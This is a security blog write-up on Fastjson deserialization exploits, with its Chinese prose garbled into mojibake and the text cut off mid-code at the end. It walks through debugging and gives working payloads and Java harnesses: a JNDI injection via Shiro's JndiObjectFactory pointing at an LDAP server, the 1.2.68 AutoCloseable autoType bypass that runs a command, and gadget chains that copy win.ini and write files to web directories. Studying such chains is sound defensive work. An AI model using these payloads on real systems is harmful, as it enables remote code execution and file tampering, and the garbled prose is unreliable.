href="https://github.com/alibaba/fastjson/wiki/%E5%BE%AA%E7%8E%AF%E5%BC%95%E7%94%A8">https://github.com/alibaba/fastjson/wiki/%E5%BE%AA%E7%8E%AF%E5%BC%95%E7%94%A8</a></p><p>fastjsonæ”¯æŒå¾ªç¯å¼•ç”¨ï¼Œå¹¶ä¸”æ˜¯ç¼ºçœæ‰“å¼€çš„ã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">//å¼•ç”¨å¯ä»¥è‡ªå·±å…³é—­ï¼Œå…³é—­åå¯èƒ½å¯¼è‡´jsonæ•°æ®ä¼ è¾“çš„æ—¶å€™ä¸¢å¤±<br>//å…¨å±€é…ç½®å…³é—­<br>JSON.DEFAULT_GENERATE_FEATURE |= SerializerFeature.DisableCircularReferenceDetect.getMask();<br>//éå…¨å±€å…³é—­<br>JSON.toJSONString(obj, SerializerFeature.DisableCircularReferenceDetect);<br></code></pre></td></tr></table></figure><table><thead><tr><th>è¯­æ³•</th><th>æè¿°</th></tr></thead><tbody><tr><td>{â€œ$refâ€:â€$â€}</td><td>å¼•ç”¨æ ¹å¯¹è±¡</td></tr><tr><td>{â€œ$refâ€:â€@â€}</td><td>å¼•ç”¨è‡ªå·±</td></tr><tr><td>{â€œ$refâ€:â€..â€}</td><td>å¼•ç”¨çˆ¶å¯¹è±¡</td></tr><tr><td>{â€œ$refâ€:â€..&#x2F;..â€}</td><td>å¼•ç”¨çˆ¶å¯¹è±¡çš„çˆ¶å¯¹è±¡</td></tr><tr><td>{â€œ$refâ€:â€$.members[0].reportToâ€}</td><td>åŸºäºè·¯å¾„çš„å¼•ç”¨</td></tr></tbody></table><p><code>$ref</code>å³å¾ªç¯å¼•ç”¨ï¼šå½“ä¸€ä¸ªå¯¹è±¡åŒ…å«å¦ä¸€ä¸ªå¯¹è±¡æ—¶ï¼ŒFastjsonå°±ä¼šæŠŠè¯¥å¯¹è±¡è§£ææˆå¼•ç”¨ã€‚å¼•ç”¨æ˜¯é€šè¿‡<code>$ref</code>æ ‡ç¤ºçš„ã€‚</p><p>æ‰€ä»¥è¿™é‡Œpocåé¢çš„{â€œ$refâ€:â€$.tmâ€}å°±æ˜¯åŸºäºè·¯å¾„å¼•ç”¨ï¼Œç›¸å½“äºè°ƒç”¨äº†æ ¹å¯¹è±¡çš„tmå±æ€§ï¼Œè‡ªç„¶å°±è¦è°ƒç”¨getæ–¹æ³•ï¼Œè¿™é‡Œçš„æ ¹å¯¹è±¡å°±æ˜¯CacheJndiTmLookup</p><p><strong>org.apache.shiro.jndi.JndiObjectFactory</strong></p><p>éœ€è¦shiro-coreå’Œslf4j-apiä¾èµ–</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&#123;&quot;@type&quot;:&quot;org.apache.shiro.jndi.JndiObjectFactory&quot;,&quot;resourceName&quot;:&quot;ldap://127.0.0.1:9999/xCxXLJwZ&quot;,&quot;instance&quot;:&#123;&quot;$ref&quot;:&quot;$.instance&quot;&#125;&#125;<br></code></pre></td></tr></table></figure><p>ä»£ç ç¤ºä¾‹ï¼š</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.JNDITest;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">liuqi_banben</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="hljs-literal">true</span>);<br>        String payload2=<span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.shiro.jndi.JndiObjectFactory\&quot;,\&quot;resourceName\&quot;:\&quot;ldap://127.0.0.1:9999/BXcEBBgx\&quot;,\&quot;instance\&quot;:&#123;\&quot;$ref\&quot;:\&quot;$.instance\&quot;&#125;&#125;&quot;</span>;<br>        JSON.parse(payload2);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202409031934084.png" alt="image-20240903193341386"></p><p><strong>åˆ©ç”¨é“¾åˆ†æ</strong></p><p><img src="https://cdn.clown2024.cn/202409032004058.png" alt="image-20240903200449945"></p><p><img src="https://cdn.clown2024.cn/202409032004849.png" alt="image-20240903200455729"></p><p>è¿™é‡Œå°±åŒç†ï¼Œè¯¥ç±»ä¹Ÿæ˜¯åªæœ‰getInstanceæ–¹æ³•ï¼Œç„¶ååˆ©ç”¨å¾ªç¯å¼•ç”¨ç„¶åè°ƒç”¨åˆ°getæ–¹æ³•è§¦å‘jndiæ¼æ´</p><h2 id="fastjson1268"><a href="#Fastjson1-2-68" class="headerlink" title="Fastjson1.2.68"></a>Fastjson1.2.68</h2><p>è¿™æ¬¡æ˜¯åˆ©ç”¨expectClassæ¥ç»•è¿‡checkAutoTypeå‡½æ•°ï¼Œå¤§ä½“æ€è·¯å¦‚ä¸‹ï¼š</p><ol><li>å…ˆä¼ å…¥æŸä¸ªç±»ï¼Œå…¶åŠ è½½æˆåŠŸåå°†ä½œä¸ºexpectClasså‚æ•°ä¼ å…¥checkAutoType()å‡½æ•°ï¼›</li><li>æŸ¥æ‰¾expectClassç±»çš„å­ç±»æˆ–å®ç°ç±»ï¼Œå¦‚æœå­˜åœ¨è¿™æ ·ä¸€ä¸ªå­ç±»æˆ–å®ç°ç±»å…¶æ„é€ æ–¹æ³•æˆ–setteræ–¹æ³•ä¸­å­˜åœ¨å±é™©æ“ä½œåˆ™å¯ä»¥è¢«æ”»å‡»åˆ©ç”¨ï¼›</li></ol><p>åˆ©ç”¨æ¡ä»¶ï¼š</p><ul><li>åˆ©ç”¨ç±»å¿…é¡»æ˜¯expectClassç±»çš„å­ç±»æˆ–å®ç°ç±»ï¼Œå¹¶ä¸”ä¸åœ¨é»‘åå•ä¸­ï¼›</li></ul><p>è¿™é‡Œå…ˆå±•ç¤ºæ”»å‡»æµç¨‹</p><p>å‡è®¾FastjsonæœåŠ¡ç«¯å­˜åœ¨å¦‚ä¸‹å®ç°AutoCloseableæ¥å£ç±»çš„æ¶æ„ç±»VulAutoCloseableï¼š</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">VulAutoCloseable</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">AutoCloseable</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">VulAutoCloseable</span><span class="hljs-params">(String cmd)</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Runtime.getRuntime().exec(cmd);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">close</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>pocå¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&#123;&quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;,&quot;@type&quot;:&quot;vul.VulAutoCloseable&quot;,&quot;cmd&quot;:&quot;calc&quot;&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><br><span class="hljs-comment">//fastjson1.2.68</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AutoType_RaoGuo</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        String payload=<span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;java.lang.AutoCloseable\&quot;,\&quot;@type\&quot;:\&quot;org.clown.vul.VulAutoCloseable\&quot;,\&quot;cmd\&quot;:\&quot;calc\&quot;&#125;&quot;</span>;<br>        JSON.parse(payload);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202409031446394.png" alt="image-20240903144639232"></p><p>å¯ä»¥çœ‹åˆ°æ²¡æœ‰å¼€å¯autoTypeSupportä¹Ÿèƒ½å¤ŸæˆåŠŸ</p><p>ç›´æ¥ä»checkAutoTypeå‡½æ•°å¼€å§‹è°ƒè¯•</p><p><img src="https://cdn.clown2024.cn/202409031453120.png" alt="image-20240903145345998"></p><p>åˆ°è¿™é‡Œå¯ä»¥ç›´æ¥å¯ä»¥ä»ç¼“å­˜ä¸­è·å–åˆ°AutoCloseableè¿™ä¸ªç±»</p><p><img src="https://cdn.clown2024.cn/202409031502045.png" alt="image-20240903150200931"></p><p>ç„¶åå¾€ä¸‹ç›´æ¥returnäº†ï¼Œå› ä¸ºè¿™æ—¶å€™expectClassè¿˜æ˜¯ç©ºçš„</p><p><img src="https://cdn.clown2024.cn/202409031532444.png" alt="image-20240903153245307"></p><p>ç„¶åä¼ è¿›å»AutoCloseableååºåˆ—åŒ–ï¼Œç»§ç»­è·Ÿè¿›</p><p><img src="https://cdn.clown2024.cn/202409031542039.png" alt="image-20240903154215912"></p><p>åˆ°è¿™é‡Œè·å–ååºåˆ—åŒ–å™¨ä¸ºç©ºï¼Œç„¶åtypeNameä¸ºæˆ‘ä»¬çš„å®ç°ç±»ï¼ŒexpectClassä¼ é€’çš„æ˜¯AutoCloseableç±»ï¼Œç»§ç»­è·Ÿè¿›checkAutoTypeå‡½æ•°</p><p><img src="https://cdn.clown2024.cn/202409031554161.png" alt="image-20240903155427045"></p><p>åˆ°è¿™é‡ŒexpectClassFlagå°±ä¸ºtrueäº†</p><p><img src="https://cdn.clown2024.cn/202409031557163.png" alt="image-20240903155741275"></p><p>æœ€åèµ°åˆ°è¿™ä¸ªåœ°æ–¹ï¼ŒexpectClassFlagä½¿åˆ¤æ–­ä¸ºtrueï¼Œæœ€ç»ˆè¿›è¡ŒloadClass</p><p><img src="https://cdn.clown2024.cn/202409031604442.png" alt="image-20240903160414341"></p><p>ç„¶åå¾€ä¸‹æœ‰å¯¹åŠ è½½çš„ç±»è¿›è¡Œåˆ¤æ–­ï¼Œè¿™äº›éƒ½æ˜¯å¸¸è§çš„jndiåˆ©ç”¨é“¾çš„ç±»ï¼Œå¦‚æœå±äºè¿™äº›ç±»æˆ–è€…å­ç±»ç›´æ¥æŠ›å‡ºå¼‚å¸¸</p><p><img src="https://cdn.clown2024.cn/202409031602941.png" alt="image-20240903160225818"></p><p>å¾€ä¸‹è¿˜æœ‰ä¸€ä¸ªåŠ å…¥ç¼“å­˜ï¼Œç„¶åreturnï¼Œè¿™é‡Œè¿˜åˆ¤æ–­äº†æˆ‘ä»¬çš„clazzæ˜¯å¦ä¸ºexpectClassçš„å­ç±»ï¼Œæ‰€ä»¥æ¶æ„ç±»å¿…é¡»è¦ç»§æ‰¿expectClass</p><p>ç„¶åå°±æ˜¯ååºåˆ—åŒ–è§¦å‘æ„é€ å‡½æ•°å¼¹è®¡ç®—å™¨</p><blockquote><p>ä¸è¿‡è¿™é‡Œä¸è¿‡getæˆ–è€…setç›´æ¥æ„é€ å‡½æ•°ä¹Ÿå¯ä»¥äº†ï¼Œåœ¨æ—©æœŸç‰ˆæœ¬æˆ‘è¯•äº†ä¸€ä¸‹åªèƒ½é»˜è®¤æ„é€ æ–¹æ³•ï¼Œä¸è¿‡å¦‚æœå­˜åœ¨é»˜è®¤æ„é€ æ–¹æ³•ä¹Ÿæ˜¯ä¼˜å…ˆé»˜è®¤æ„é€ æ–¹æ³•</p></blockquote><h3 id="å®æˆ˜åˆ©ç”¨"><a href="#å®æˆ˜åˆ©ç”¨" class="headerlink" title="å®æˆ˜åˆ©ç”¨"></a>å®æˆ˜åˆ©ç”¨</h3><p>å®æˆ˜ä¸­è¦å»æ‰¾å®é™…å¯è¡Œçš„åˆ©ç”¨ç±»ï¼Œä¹Ÿå°±æ˜¯ç»§æ‰¿äº†autoCloaseableç±»çš„ï¼Œä¸»è¦æ˜¯å¯»æ‰¾å…³äºè¾“å…¥è¾“å‡ºæµçš„ç±»æ¥å†™æ–‡ä»¶ï¼ŒIntputStreamå’ŒOutputStreaméƒ½æ˜¯å®ç°è‡ªAutoCloseableæ¥å£çš„ã€‚</p><p>å¯»æ‰¾gadgetçš„æ¡ä»¶å¯ä»¥å‚è€ƒè¿™æ ·ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">éœ€è¦ä¸€ä¸ªé€šè¿‡ set æ–¹æ³•æˆ–æ„é€ æ–¹æ³•æŒ‡å®šæ–‡ä»¶è·¯å¾„çš„ OutputStream<br>éœ€è¦ä¸€ä¸ªé€šè¿‡ set æ–¹æ³•æˆ–æ„é€ æ–¹æ³•ä¼ å…¥å­—èŠ‚æ•°æ®çš„ OutputStreamï¼Œå‚æ•°ç±»å‹å¿…é¡»æ˜¯byte[]ã€ByteBufferã€Stringã€char[]å…¶ä¸­çš„ä¸€ä¸ªï¼Œå¹¶ä¸”å¯ä»¥é€šè¿‡ set æ–¹æ³•æˆ–æ„é€ æ–¹æ³•ä¼ å…¥ä¸€ä¸ª OutputStreamï¼Œæœ€åå¯ä»¥é€šè¿‡ write æ–¹æ³•å°†ä¼ å…¥çš„å­—èŠ‚ç  write åˆ°ä¼ å…¥çš„ OutputStream<br>éœ€è¦ä¸€ä¸ªé€šè¿‡ set æ–¹æ³•æˆ–æ„é€ æ–¹æ³•ä¼ å…¥ä¸€ä¸ª OutputStreamï¼Œå¹¶ä¸”å¯ä»¥é€šè¿‡è°ƒç”¨ toStringã€hashCodeã€getã€setã€æ„é€ æ–¹æ³• è°ƒç”¨ä¼ å…¥çš„ OutputStream çš„ closeã€write æˆ– flush æ–¹æ³•<br>ä»¥ä¸Šä¸‰ä¸ªç»„åˆåœ¨ä¸€èµ·å°±èƒ½æ„é€ æˆä¸€ä¸ªå†™æ–‡ä»¶çš„åˆ©ç”¨é“¾ï¼Œæˆ‘é€šè¿‡æ‰«æäº†ä¸€ä¸‹ JDK ï¼Œæ‰¾åˆ°äº†ç¬¦åˆç¬¬ä¸€ä¸ªå’Œç¬¬ä¸‰ä¸ªæ¡ä»¶çš„ç±»ã€‚<br></code></pre></td></tr></table></figure><p>ä¸‹é¢æ˜¯ä¸€äº›åˆ©ç”¨payload</p><p><strong>å¤åˆ¶æ–‡ä»¶</strong></p><p>åˆ©ç”¨ç±»ï¼š<strong>org.eclipse.core.internal.localstore.SafeFileOutputStream</strong></p><p>åˆ©ç”¨ä¾èµ–ï¼š</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.aspectj<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>aspectjtools<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.9.5<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>å»çœ‹ä¸€ä¸‹SafeFileOutputStreamçš„æºç ï¼š</p><p><img src="https://cdn.clown2024.cn/202409031659197.png" alt="image-20240903165946075"></p><p>è¯¥æ„é€ å‡½æ•°åˆ¤æ–­å¦‚æœtargetPathæ–‡ä»¶ä¸å­˜åœ¨ä¸”tempPathæ–‡ä»¶å­˜åœ¨ï¼Œå°±ä¼šæŠŠtempPathå¤åˆ¶åˆ°targetPathä¸­</p><p>åˆ©ç”¨PoCï¼š</p><figure class="highlight json"><table><tr><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;org.eclipse.core.internal.localstore.SafeFileOutputStream&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;tempPath&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;C:/Windows/win.ini&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;targetPath&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;D:/win.txt&quot;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.File_Use;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">File_Move</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        String payload=<span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;java.lang.AutoCloseable\&quot;, \&quot;@type\&quot;:\&quot;org.eclipse.core.internal.localstore.SafeFileOutputStream\&quot;, \&quot;tempPath\&quot;:\&quot;C:/Windows/win.ini\&quot;, \&quot;targetPath\&quot;:\&quot;D:/win.txt\&quot;&#125;&quot;</span>;<br>        JSON.parse(payload);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202409031704660.png" alt="image-20240903170451492"></p><p><strong>æ–‡ä»¶å†™å…¥</strong></p><p>å†™å†…å®¹ç±»ï¼š<strong>com.esotericsoftware.kryo.io.Output</strong></p><p>ä¾èµ–ï¼š</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.esotericsoftware<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>kryo<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.0.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>Outputç±»ä¸»è¦ç”¨æ¥å†™å†…å®¹ï¼Œå®ƒæä¾›äº†setBuffer()å’ŒsetOutputStream()ä¸¤ä¸ªsetteræ–¹æ³•å¯ä»¥ç”¨æ¥å†™å…¥è¾“å…¥æµï¼Œå…¶ä¸­bufferå‚æ•°å€¼æ˜¯æ–‡ä»¶å†…å®¹ï¼ŒoutputStreamå‚æ•°å€¼å°±æ˜¯å‰é¢çš„SafeFileOutputStreamç±»å¯¹è±¡ï¼Œè€Œè¦è§¦å‘å†™æ–‡ä»¶æ“ä½œåˆ™éœ€è¦è°ƒç”¨å…¶flush()å‡½æ•°</p><p>çœ‹ä¸€ä¸‹Outputç±»çš„æºç </p><p><img src="https://cdn.clown2024.cn/202409031911793.png" alt="image-20240903191151647"></p><p><img src="https://cdn.clown2024.cn/202409031915040.png" alt="image-20240903191539933"></p><p><img src="https://cdn.clown2024.cn/202409031913515.png" alt="image-20240903191344410"></p><p>æ‰€ä»¥æˆ‘ä»¬è¦æƒ³åŠæ³•è°ƒç”¨åˆ°Outputçš„flushå‡½æ•°</p><p>flushå‡½æ•°å¯ä»¥åœ¨è°ƒç”¨closeå‡½æ•°å’Œrequireå‡½æ•°æ—¶è§¦å‘</p><p><img src="https://cdn.clown2024.cn/202409032015641.png" alt="image-20240903201552519"></p><p><img src="https://cdn.clown2024.cn/202409032015969.png" alt="image-20240903201535860"></p><p>ç„¶årequireå‡½æ•°åœ¨writeç›¸å…³å‡½æ•°è§¦å‘</p><p><img src="https://cdn.clown2024.cn/202409032016029.png" alt="image-20240903201620928"></p><p><img src="https://cdn.clown2024.cn/202409032017695.png" alt="image-20240903201703586"></p><p>ç„¶åæ‰¾åˆ°JDKçš„ObjectOutputStreamç±»ï¼Œå…¶å†…éƒ¨ç±»BlockDataOutputStreamçš„æ„é€ å‡½æ•°ä¸­å°†OutputStreamç±»å‹å‚æ•°èµ‹å€¼ç»™outæˆå‘˜å˜é‡ï¼Œè€Œå…¶setBlockDataMode()å‡½æ•°ä¸­è°ƒç”¨äº†drain()å‡½æ•°ã€drain()å‡½æ•°ä¸­åˆè°ƒç”¨äº†out.write()å‡½æ•°ï¼Œæ»¡è¶³å‰é¢çš„éœ€æ±‚</p><blockquote><p>è¿™éƒ½å’‹æ‰¾çš„å•ŠğŸ˜¢</p></blockquote><p><img src="https://cdn.clown2024.cn/202409032020430.png" alt="image-20240903202010304"></p><p><img src="https://cdn.clown2024.cn/202409032020708.png" alt="image-20240903202044589"></p><p>ç„¶åå¯¹äºsetBlockDataMode()å‡½æ•°çš„è°ƒç”¨ï¼Œåœ¨ObjectOutputStreamç±»çš„æœ‰å‚æ„é€ å‡½æ•°ä¸­å°±å­˜åœ¨</p><p><img src="https://cdn.clown2024.cn/202409032023421.png" alt="image-20240903202324306"></p><p>ä½†æ˜¯Fastjsonä¼˜å…ˆè·å–çš„æ˜¯ObjectOutputStreamç±»çš„æ— å‚æ„é€ å‡½æ•°ï¼Œå› æ­¤åªèƒ½æ‰¾ObjectOutputStreamçš„ç»§æ‰¿ç±»æ¥è§¦å‘ï¼Œç„¶åæ‰¾åˆ°åªæœ‰æœ‰å‚æ„é€ å‡½æ•°çš„ObjectOutputStreamç»§æ‰¿ç±»ï¼š<strong>com.sleepycat.bind.serial.SerialOutput</strong>ï¼Œè¿™ä¸ªç±»åœ¨è¿™ä¸ªä¾èµ–é‡Œé¢</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.sleepycat<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>je<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>5.0.73<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202409032027918.png" alt="image-20240903202720784"></p><p>ç„¶åè¿™é‡Œè°ƒç”¨äº†çˆ¶ç±»çš„æ„é€ æ–¹æ³•ï¼Œåˆ°è¿™é‡Œæœ€ç»ˆæ»¡è¶³æ¡ä»¶</p><p>pocå¦‚ä¸‹ï¼Œç„¶åä¹Ÿè¿ç”¨äº†å‰é¢çš„å¾ªç¯å¼•ç”¨æŠ€å·§</p><figure class="highlight json"><table><tr><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;stream&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;org.eclipse.core.internal.localstore.SafeFileOutputStream&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;targetPath&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;D:/wamp64/www/hacked.txt&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;tempPath&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;D:/wamp64/www/test.txt&quot;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;writer&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;com.esotericsoftware.kryo.io.Output&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;buffer&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;cHduZWQ=&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;outputStream&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;$ref&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;$.stream&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;position&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">5</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;close&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;com.sleepycat.bind.serial.SerialOutput&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;out&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;$ref&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;$.writer&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>ä½†æ˜¯å†™å…¥æ–‡ä»¶æœ‰é™ï¼Œæœ‰äº›ç‰¹æ®Šå­—ç¬¦å†™ä¸äº†ï¼Œæ¯”å¦‚phpä»£ç </p><blockquote><p>payloadç›´æ¥æŠ„äº†ï¼Œæ€ä¹ˆå†™å‡ºæ¥çš„å°±ä¸ç®¡äº†ï¼ˆ</p></blockquote><p>ä»£ç ç¤ºä¾‹ï¼š</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.File_Use;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">File_Write</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        String payload=<span class="hljs-string">&quot;&#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;    \&quot;stream\&quot;: &#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;@type\&quot;: \&quot;java.lang.AutoCloseable\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;@type\&quot;: \&quot;org.eclipse.core.internal.localstore.SafeFileOutputStream\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;targetPath\&quot;: \&quot;D:/hacked.txt\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;tempPath\&quot;: \&quot;\&quot;\n&quot;</span> +<br>                <span class="hljs-string">&quot;    &#125;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;    \&quot;writer\&quot;: &#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;@type\&quot;: \&quot;java.lang.AutoCloseable\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;@type\&quot;: \&quot;com.esotericsoftware.kryo.io.Output\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;buffer\&quot;: \&quot;cHduZWQ=\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;outputStream\&quot;: &#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;            \&quot;$ref\&quot;: \&quot;$.stream\&quot;\n&quot;</span> +<br>                <span class="hljs-string">&quot;        &#125;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;position\&quot;: 5\n&quot;</span> +<br>                <span class="hljs-string">&quot;    &#125;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;    \&quot;close\&quot;: &#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;@type\&quot;: 